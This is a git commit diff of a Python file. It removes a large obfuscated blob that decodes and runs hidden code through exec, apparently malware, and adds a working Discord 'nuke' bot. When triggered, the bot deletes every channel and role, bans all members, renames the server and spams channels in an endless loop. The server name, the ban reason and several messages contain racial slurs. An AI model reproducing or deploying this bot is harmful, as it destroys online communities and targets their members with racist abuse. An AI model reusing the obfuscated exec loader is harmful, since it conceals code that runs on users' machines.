5d3a4d2949134cb0a293b968181ae42d6f863738
f_dseilix <113546585+felix10071@users.noreply.github.com>
2023-11-14 16:53:14 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,80 @@
-#pip install pycryptodome  , It works only v3.11 Above.
-import random ,base64,codecs,zlib;pyobfuscate=""
+import discord
+from discord.ext import commands
+import asyncio
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import zlib)'],['''Ao1Lo12UEcooW{?ONKh%uej`&KMv<$pJKGyKZ(zKx3|59$f_F2v`)#HovPA`tBcn7TArxK(ltQBro6U{PE$jVQ?g^LEqxu5p?JhQF4voo31AM8#qQz+_nD2F2}_14nA*pjBnoIf`PJVBIZ0wzj=-)8Zgn**7w&GzhM+VD#<X0ldKVve<@I@}FGrlGTf^mUBG}-{m<c?O{n)%gDG>ILleZLs8wN`l#{7pyg`(tG7jAsdfCxH8#pU_Ey*{G*y64p^K(r0-b*+0amEr8^gO=-nk&2^cS*(_D3`?pKl<l~hC=E1irqJ|3C$pR#YicC+f6;c%9Pf1$`fXZ%HW``Y1BmrGC<);lv+vh|700B+>GCxp0J^-bm`S>1`hV4nY4Iq#6kNVVfU_pk-CI;C!kjwSCS|Y<$?K48<!J@^5oK?i08Cxkx8G06YLO(F*V0Fr@rK67xql%U3>x2e%RL{-86T-CHTDOeNtjn+{|YB#_tn$hYlH!2Y`TV&sKK74nuyt_^03%U;+&9{ao|V0J_#&+L0&Gc91dfqL^pI?^bDn4tj;M7J5ZhV6yu-L%!c>^F9|z)mnAj<cxK+$X72*y&NCSn#~O3%j)c|-%fJ9b6v3jIs#!fNAkOxj=wOxOV;2;-FW1{H;Pf}O9vO&9g7jl|^>h_)90O3f4wrd#4+!mpTU$|Q9mY9UdAPX3dkx{djj)=WTE`3jk|=S4Hl7V6rER3;K%HFLaUfn>Y;J8+FA)#n`SJ4xNZ3E3@oZ^D!pb}-)@v2${nj!Ep!tyE$ygIsk+_z^%*DSnq8T~>ltrhgFVN=guBeI&gZq56v5OcQZ%{e5b^hE{%Y-%w0T}CJH2KZNv6dB>wKk0$BGLy$naN<}X!0VGmNQ42Jflc)BDAogK~$3#pl4-`;aX&rKE=y{fdcqDgJjY*C77dymrB-%uuf_blu+J%rU{!v?I(i;;u%lyM0P+_BFBg%8`YW!i2|G_=RUUb#$+obrf=s$$ENP{NGhIulJT&~YM~I(tSu?Zoxu@W%LK@szWlVR4A2+{J(X@wD=BFeZS^#!>}Eq{kPJXS?o@6MZ$?16;}q_F*b(mTc086&q!{i~Z2o;(EcUe$*^t{{m-*O$pc2;1=j3A+?Fe()7`=xTtUI=|&sl1B&)LHP1&=f`4H)nR6K{}9$MILfBbI=*=wjdarK&;`j7wi^)E($yS@N%sz|}Qpj3ekF-DjVo39sMgYk2KQiH%>HY*YZ`MCEUo>Kb83uPn@~ar&tbt;WxBrsCnot`+g2u_#euQ@i|+6=ryi!YsdTqu8DZ9dV9WeuPuGFn5Nh&8g-`<Nd)3itp~*XGcVLrN_pS!Njrr3a1^~8nqc*J)20D%Rx2hcfqA`Ee@-24xLFE1plfubVBVLujBNZWJVSrlekI`#AE-bccOie934$;Ji(DX*>KM;^?2#=19&Kd9{K7<iwAJ+)pAp#E3$%O;NLH=ryu1$$-U+J7GFJa7L+uUPMVBb=!ZrhTT-(9Ax|{|5%L&jL!G3x;s2TsKrnf5l*GM1Fj~PiB)^ID>i8bAvN9h1;j~buFdumXV4@Nv8kKVGQHP+TCvg;S{drM7JAgKoznx;w@WmpO8NRs=ydeR!hc)#V`}pt3BdDW10BxrxeZK`vb<+&VAA}k9=q~=BzQaFhy#N)D49q{D#RAx1BP~Nx(F^|@Sm`%O;T`#ukqT8yw1>&FhBQ2ye61~!a;r(vf6UV3zfHQa%f+3NnCg%8!6&uU!-r1?@%|u;{35eq#y9bNeo-~Zn}08!49NyEJF-~l1;Ej)L(rCN#!y=0xv$|m&5GbuAU$aYGHh=GkAD-y!85$}(<61}noi3aPiiO%S4P6o&0L};412K(K$BzOC-2{<GZL_@Q&l!NsNcW!-+1Hrqg0OjA7Mu^n0j2ruSU2p&UR{+hrGp0+-GVFYa{|5ZbUb{D8i14hJcvq(oSiPU%<8r9SvX-iddW`WSj%-(K8%GVBjaeCH&sL(?$%*$Yj&y#u-EY4%lS9kgvM^TfV;tS>_-4lsk|<lI=2oWsf~Q#-3Odmt!9gXweG~ljfT3c_U$*3U;1E-~yymGe-}suE|%|8L%Rw-O9XW%4!aBXV@6PqUT4Uq1{dZO+_V89pok^p7)^OL@%oS6G}Tk?#+=F6u{qXdq^KvC9=*(!{5?!S}dBEs3}M!%|PWH>{_KzJsYwGS&)cadI!Non^%3F=|%212s(+f{||`~(vvgorp9*QBymD9{<U=Q6e#Snj*$o;S>;5fUqAz{b^phoUzg~w*d1=ZGj)FD_lqMh2%9iUncZdwsEdheJVt%5nwPh|%m2rK_zREG&i-97ykRECe)P~)6m{Xd9$=BO=R?7tWU+S9;l)sCx)Idku7b^5uFYK`hax8cJ9)=fQm-y-66XC+x=Lk&#g9013;=YFhMn<BYrFtV*&nXGByX@yIQx2BD^66;F28l_g?vIXBB0KOpaK9Z|EM$T4uj}Jo{-ItNMnp><G56j3H4ZFgl|Svucf;0d@kQy81oxIMq2;DV%wZ`zUt;7PhfglNV6F?SR7P<!mrIyQe`Tz5=$S-Z<7bjC!)TO<kDmot5u!@kZS|At(SEtD2{$%?|0Q{F+w5-&Xt61v@1KaxGcFvv6dnOqZT(#+6<W933U)R>}EvPb}60bFtb7dnPYCG`tS2&!S14-_JbWzG9QKx@#UQ{Lgcrg2t%31&~{3fk>8>m@b$5cZJ$Zj*{b9OEzh0>Vl|zj(wK2RTPIsgYPV&6DzL#aD&BO$DWb)XH$~(FbH~>OQ1Ouf&0KQxvwZAl1Ok{UMoRLX5dI8=m`ha34xt(_wG^R@*0El6)nf+Hs?uodz0m$h55>-R3&B~M^5Vz)$4mJXx*XyWf*K&4z3O-wVCPo>?v)%DheIi-t<cB_t1F}ETLjst9-<<%>x>qVgZ3JQJ6INJGd;R;1xVUw-E{-t(YJlVIS}WH6-wIs{b9+AOX`UApvxwLvSKvfgpff$dz%Ol=6sPjr6n>|@gVTr%#KG(WLPTbCn7RIj6c&tV0>WlXTvj3MqlWjIKMn7+&HFQ(m{%>+;P|uVa}Cd0-bATU<XOtPSd6Lb|AMT=U}wdm8(=<K8dmGhTQXz(3*R%Bls)(gwho=e?s(Pc1*iAF!Zzew43%)4vv^`V3YY6+B)MwBfjBX(oln-x3UUH`&1`*MenfFF$<z<(n<U*I;cUWIG-;mPNE`-QC~%D9(Eh<o^wHDh^*;&uI~v$!nFZTMr~431c6!g+1&yPQ@ePJZN|u?>}to#HRHc^3Z`N'''.replace('\n','')]))
+def ask_question(question):
+    print(question)
+    response = input()
+    return response.lower()
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
-                
+def ask_token(question):
+    print(question)
+    response = input()
+    return response
+
+token = ask_token("bot token")
+delete_channels = ask_question("Delete all channels? (y/n)") == 'y'
+delete_roles = ask_question("Delete all roles? (y/n)") == 'y'
+ban_option = ask_question("Ban members? (y/n): ") == "y"
+intents = discord.Intents.all()  # or any specific intents you need
+bot = commands.Bot(command_prefix='s!', intents=intents)
+
+
+@bot.event
+async def on_ready():
+    print("Party pooper 3000 has booted")
+
+
+@bot.command(name='Help', pass_context=True)
+@commands.has_permissions(manage_channels=True, ban_members=True, manage_roles=True, manage_guild=True)
+async def help_command(ctx):
+
+   
+    if delete_channels:
+        #Delete all channels
+        for channel in bot.guilds[0].channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.55)
+            except:
+                continue
+
+    if delete_roles:
+        #Delete all roles
+        for role in bot.guilds[0].roles:
+            try:
+                await role.delete()
+                await asyncio.sleep(0.55)
+            except:
+                continue
+
+    if ban_option:
+        # Ban all members
+        for member in bot.guilds[0].members:
+            try:
+                await member.ban(reason="Get nuked NIGGERS")
+                await asyncio.sleep(0.55)
+            except:
+                continue
+                        
+     # Change server name
+    await ctx.guild.edit(name="get nuked NIGGERS")
+    print(f'Server name has been changed to: {ctx.guild.name}')
+    
+    
+    # Create new roles repeatedly from a list
+    while True:  # This will create an infinite loop
+        await ctx.guild.create_role(name="niggeR")
+        await asyncio.sleep(0.55)
+        hannel = await ctx.guild.create_text_channel("niggeR")
+        await asyncio.sleep(0.55)
+        for channel in ctx.guild.channels:
+            if isinstance(channel, discord.TextChannel):  # Check if the channel is a text channel
+                await channel.send("fuck you @everyone")
+                await asyncio.sleep(0.55)
+                await channel.send("FUCK ME @everyone")
+                await asyncio.sleep(0.55)
+                await channel.send("NIGGER @everyone")
+        
+
+bot.run(token)  # replace with your bot's token
